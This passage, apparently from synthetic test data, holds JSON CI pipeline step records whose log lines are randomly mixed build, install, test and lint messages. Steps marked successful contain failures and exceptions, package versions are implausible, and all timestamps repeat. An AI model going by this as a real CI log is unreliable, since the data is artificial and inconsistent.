          "Cache hit for key-1436",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-4168",
          "Step 6/10: Building",
          "Cache hit for key-1387",
          "  PASS: test_api_health (234ms)",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "WARNING: webpack has known vulnerabilities",
          "Installing express@2.3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2717 build failed with exit code 33",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing jest@5.8.0",
          "  PASS: test_user_create (318ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-3711",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:35] INFO: Processing request",
          "Installing eslint@1.4.0",
          "Compiling src/handler.rs...",
          "Installing axios@1.0.0",
          "\u2713 build completed",
          "\u2713 build completed",
          "Cache hit for key-1599",
          "  PASS: test_api_health (375ms)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (96ms)",
          "Cache hit for key-7826",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 4/10: Building",
          "Installing axios@5.10.0",
          "FAILED: test_api_health",
          "Compiling src/main.py...",
          "Installing webpack@5.3.0",
          "\u2713 test completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 test completed",
          "Cache hit for key-8478",
          "\u2713 lint completed",
          "Cache hit for key-6327",
          "Step 8/10: Building",
          "  PASS: test_auth_login (324ms)",
          "\u2713 test completed",
          "Installing webpack@5.16.0",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (189ms)",
          "Step 10/10: Building",
          "WARNING: react has known vulnerabilities",
          "Step 4/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:35] INFO: Processing request",
          "Step 10/10: Building",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_cache_hit (316ms)",
          "[12:00:35] INFO: Processing request",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-14T12:01:42.064072",
        "finished_at": "2025-12-14T12:01:45.177342",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "\u2713 build completed",
          "Cache hit for key-4781",
          "Cache hit for key-3542",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing eslint@4.4.0",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (293ms)",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache hit for key-4233",
          "Cache hit for key-6437",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (85ms)",
          "  PASS: test_cache_hit (477ms)",
          "Installing webpack@4.13.0",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Cache hit for key-2199",
          "  PASS: test_cache_hit (307ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Exception: NullPointerException",
          "[12:00:35] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Exception: TypeError",
          "Cache hit for key-7909",
          "\u2713 lint completed",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Installing webpack@5.8.0",
          "\u2713 build completed",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (431ms)",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (39ms)",
          "[12:00:35] INFO: Processing request",
          "Installing eslint@1.0.0",
          "Installing webpack@3.16.0",
          "Installing jest@1.1.0",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-7381",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "FAILED: test_db_connect",
          "Compiling src/utils.go...",
          "Cache hit for key-9468",
          "  PASS: test_user_create (407ms)",
          "Exception: RuntimeError",
          "  PASS: test_auth_login (18ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Cache hit for key-2929",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (216ms)",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-1191",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (267ms)",
          "Compiling src/service.java...",
          "Cache hit for key-4198",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-5041",
          "  PASS: test_db_connect (104ms)",
          "  PASS: test_cache_hit (486ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Cache hit for key-1900",
          "\u2713 lint completed",
          "Cache hit for key-4297",
          "Installing webpack@4.17.0",
          "Compiling src/app.ts...",
          "Cache hit for key-3071",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (215ms)",
          "\u2713 lint completed",
          "Cache hit for key-8423",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-9725",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling src/handler.rs...",
          "Installing axios@5.8.0",
          "[12:00:35] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 5/10: Building",
          "[12:00:35] INFO: Processing request",
          "Installing lodash@4.12.0",
          "Cache hit for key-4705",
          "  PASS: test_api_health (399ms)",
          "  PASS: test_user_create (192ms)",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-14T12:01:45.177342",
        "finished_at": "2025-12-14T12:01:52.960516",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 test completed",
          "Installing react@5.15.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (286ms)",
          "[12:00:35] ERROR: Connection failed",
          "Installing prettier@1.6.0",
          "  PASS: test_user_create (49ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (258ms)",
          "Step 10/10: Building",
          "\u2713 build completed",
          "  PASS: test_cache_hit (430ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling src/app.ts...",
          "Cache hit for key-7460",
          "WARNING: react has known vulnerabilities",
          "Step 2/10: Building",
          "  PASS: test_api_health (178ms)",
          "\u2717 build failed with exit code 43",
          "Cache hit for key-3996",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-1946",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (274ms)",
          "[12:00:35] INFO: Processing request",
          "Step 3/10: Building",
          "Installing axios@4.18.0",
          "Cache hit for key-7847",
          "Step 3/10: Building",
          "FAILED: test_auth_login",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/app.ts...",
          "Installing jest@1.3.0",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "Step 9/10: Building",
          "Installing express@3.6.0",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Step 7/10: Building",
          "  PASS: test_user_create (389ms)",
          "  PASS: test_api_health (193ms)",
          "WARNING: axios has known vulnerabilities",
          "Installing react@1.13.0",
          "  PASS: test_db_connect (271ms)",
          "Cache hit for key-2905",
          "Installing express@5.13.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 46",
          "Cache hit for key-8597",
          "Step 9/10: Building",
          "Step 9/10: Building",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (210ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Installing eslint@5.3.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_db_connect (28ms)",
          "Installing webpack@5.1.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Installing eslint@2.8.0",
          "[12:00:35] INFO: Processing request",
          "Installing react@3.14.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_db_connect (359ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing react@3.11.0",
          "  PASS: test_api_health (160ms)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-2421",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing webpack@3.10.0",
          "  PASS: test_cache_hit (313ms)",
          "\u2713 build completed",
          "\u2713 test completed",
          "Cache hit for key-7714",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-1648",
          "Installing eslint@1.6.0",
          "\u2713 lint completed",
          "Cache hit for key-7352",
          "  PASS: test_auth_login (322ms)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Step 5/10: Building",
          "  PASS: test_cache_hit (490ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing jest@1.3.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Installing lodash@3.13.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 test completed",
          "Cache hit for key-3984",
          "\u2717 build failed with exit code 29",
          "Installing express@4.18.0",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-14T12:01:52.960516",
        "finished_at": "2025-12-14T12:02:00.743690",
        "log_lines": [
          "=== Step: lint ===",
          "Compiling src/service.java...",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-2692",
          "\u2713 test completed",
          "WARNING: react has known vulnerabilities",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 build completed",
          "Installing webpack@1.15.0",
          "Compiling src/main.py...",
          "Step 3/10: Building",
          "Cache hit for key-5143",
          "Cache hit for key-6460",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "Installing axios@4.12.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "Installing react@3.4.0",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "\u2713 test completed",
          "\u2713 build completed",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-8293",
          "Compiling src/app.ts...",
          "Cache hit for key-5101",
          "Installing lodash@3.19.0",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Cache hit for key-3736",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:35] INFO: Processing request",
          "Installing express@5.7.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-5904",
          "  PASS: test_cache_hit (212ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing jest@4.8.0",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 build completed",
          "[12:00:35] ERROR: Connection failed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache hit for key-6752",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_cache_hit (202ms)",
          "WARNING: axios has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-5579",
          "Exception: ValueError",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing axios@3.9.0",
          "Installing eslint@5.13.0",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_user_create (471ms)",
          "Cache hit for key-3598",
          "\u2713 lint completed",
          "\u2713 build completed",
          "  PASS: test_auth_login (361ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_user_create (413ms)",
          "Cache hit for key-4072",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:35] INFO: Processing request",
          "Installing eslint@5.19.0",
          "Installing react@3.2.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing webpack@5.0.0",
          "\u2713 build completed",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing react@3.20.0",
          "\u2713 test completed",
          "  PASS: test_user_create (349ms)",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-4643",
          "Cache hit for key-3453",
          "Step 8/10: Building",
          "Installing webpack@2.20.0",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-7827",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Installing express@5.2.0",
          "Step 1/10: Building",
          "  PASS: test_user_create (488ms)",
          "Installing lodash@4.10.0",
          "Exception: NullPointerException",
          "Cache hit for key-5190",
          "Artifact uploaded: build.tar.gz (29MB)",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-14T12:02:00.743690",
        "finished_at": "2025-12-14T12:02:08.526864",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 build completed",
          "  PASS: test_user_create (174ms)",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2717 build failed with exit code 10",
          "  PASS: test_db_connect (340ms)",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3635",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-9242",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (27ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-7899",
          "\u2713 test completed",
          "\u2713 build completed",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "Step 3/10: Building",
          "\u2713 build completed",
          "Step 2/10: Building",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "  PASS: test_cache_hit (140ms)",
          "Cache hit for key-3414",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-3058",
          "[12:00:35] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing axios@1.3.0",
          "Compiling src/service.java...",
          "FAILED: test_auth_login",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "Installing lodash@5.5.0",
          "\u2713 build completed",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Installing webpack@2.6.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 3/10: Building",
          "Step 4/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-4982",
          "  PASS: test_db_connect (147ms)",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (353ms)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:35] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 7/10: Building",
          "Step 10/10: Building",
          "Step 2/10: Building",
          "  PASS: test_db_connect (270ms)",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3523",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/service.java...",
          "Cache hit for key-6019",
          "  PASS: test_auth_login (433ms)",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "  PASS: test_auth_login (190ms)",
          "Step 10/10: Building",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Step 1/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Installing react@4.8.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (458ms)",
          "Cache hit for key-6809",
          "\u2713 test completed",
          "Cache hit for key-7371",
          "  PASS: test_cache_hit (34ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_user_create (295ms)",
          "Installing express@3.18.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 6/10: Building",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-4719",
          "  PASS: test_user_create (27ms)",
          "Installing lodash@4.6.0",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 64",
          "\u2713 build completed",
          "  PASS: test_user_create (46ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-14T12:02:08.526864",
        "finished_at": "2025-12-14T12:02:16.310038",
        "log_lines": [
          "=== Step: setup_node ===",
          "\u2717 build failed with exit code 107",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing webpack@3.11.0",
          "  PASS: test_auth_login (242ms)",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "\u2717 build failed with exit code 77",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing eslint@4.3.0",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (214ms)",
          "Cache hit for key-9013",
          "Cache hit for key-7861",
          "\u2713 test completed",
          "  PASS: test_auth_login (109ms)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-8772",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/handler.rs...",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "  PASS: test_api_health (429ms)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-3332",
          "Cache hit for key-3681",
          "Compiling src/app.ts...",
          "\u2717 build failed with exit code 50",
          "Step 4/10: Building",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-6179",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_db_connect (487ms)",
          "Cache hit for key-1034",
          "Installing react@2.16.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing axios@3.14.0",
          "  PASS: test_user_create (383ms)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (239ms)",
          "\u2713 test completed",
          "Installing webpack@1.0.0",
          "Step 3/10: Building",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "Exception: NullPointerException",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing webpack@4.6.0",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Compiling src/main.py...",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (296ms)",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (206ms)",
          "Cache hit for key-5921",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:35] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_api_health (218ms)",
          "  PASS: test_api_health (421ms)",
          "Step 8/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-2633",
          "Cache hit for key-1726",
          "  PASS: test_cache_hit (388ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing lodash@1.16.0",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (122ms)",
          "WARNING: webpack has known vulnerabilities",
          "Installing webpack@5.11.0",
          "Installing lodash@5.16.0",
          "Installing lodash@3.9.0",
          "\u2717 build failed with exit code 113",
          "\u2713 test completed",
          "\u2713 test completed",
          "Cache hit for key-1669",
          "Installing react@3.3.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-9949",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing react@3.7.0",
          "\u2713 lint completed",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 build completed",
          "  PASS: test_cache_hit (380ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (435ms)",
          "  PASS: test_auth_login (467ms)",
          "Cache hit for key-7532",
          "Cache hit for key-5336",
          "  PASS: test_cache_hit (377ms)",
          "  PASS: test_cache_hit (487ms)",
          "Compiling src/app.ts...",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_api_health (404ms)",
          "Cache hit for key-9237",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing axios@3.15.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing react@4.16.0",
          "\u2713 test completed",
          "Installing express@5.1.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_api_health (242ms)",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Cache hit for key-4612",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-14T12:02:16.310038",
        "finished_at": "2025-12-14T12:02:39.659560",
        "log_lines": [
          "=== Step: unit_tests ===",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-5542",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "Cache hit for key-3146",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Step 10/10: Building",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 1/10: Building",
          "Cache hit for key-5922",
          "[12:00:35] ERROR: Connection failed",
          "Compiling src/main.py...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-7749",
          "Step 9/10: Building",
          "Installing prettier@4.12.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_user_create (89ms)",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/index.js...",
          "Cache hit for key-8468",
          "Installing jest@3.10.0",
          "Installing prettier@4.10.0",
          "Cache hit for key-8612",
          "Cache hit for key-2628",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_user_create (442ms)",
          "Cache hit for key-6212",
          "Cache hit for key-8100",
          "FAILED: test_cache_hit",
          "Cache hit for key-6344",
          "Step 4/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-7204",
          "  PASS: test_db_connect (146ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "FAILED: test_cache_hit",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 test completed",
          "\u2713 build completed",
          "  PASS: test_api_health (47ms)",
          "\u2713 build completed",
          "Cache hit for key-7701",
          "  PASS: test_api_health (1ms)",
          "Compiling src/service.java...",
          "  PASS: test_user_create (172ms)",
          "Cache hit for key-8289",
          "Cache hit for key-3849",
          "  PASS: test_api_health (60ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 8/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-6282",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (438ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_user_create (471ms)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/index.js...",
          "Installing react@1.18.0",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 5/10: Building",
          "WARNING: express has known vulnerabilities",
          "Installing lodash@4.4.0",
          "Installing prettier@5.8.0",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-4596",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 test completed",
          "  PASS: test_auth_login (394ms)",
          "Compiling src/main.py...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (101ms)",
